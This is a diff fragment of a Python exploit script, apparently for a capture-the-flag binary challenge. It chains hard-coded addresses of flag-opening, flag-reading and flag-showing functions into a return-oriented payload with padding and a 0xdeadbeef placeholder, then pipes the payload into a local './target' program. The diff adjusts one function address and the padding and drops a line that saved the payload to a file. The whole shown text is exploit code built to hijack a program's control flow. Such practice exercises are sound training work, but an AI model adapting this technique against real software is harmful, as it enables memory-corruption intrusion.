@@ -10,7 +10,7 @@ def p32(n):
 
 # Open flag, Read_flag, show_flag
 
-FN_OPENFLAG = 0x08048470
+FN_OPENFLAG = 0x0804847d
 ADDR_READFLAG = 0x080485cf #=POP-RET
 CAN_OPENFLAG = 0xdeadbeef
 FN_READFLAG = 0x080484c1
@@ -30,11 +30,9 @@ def get_payload():
         + p32(CAN_RF1)       	\
 	+ p32(CAN_RF2)		\
 	+ p32(FN_SHOWFLAG)	\
-	+ 'AAA3'		\
+	+ 'AAAA'		\
 	+ "\n"		
         
 if __name__ == '__main__':
-    with open("temp.txt","wb") as f:
-	f.write(get_payload())
     p = sp.Popen("./target", stdin=sp.PIPE)
     p.stdin.write(get_payload())
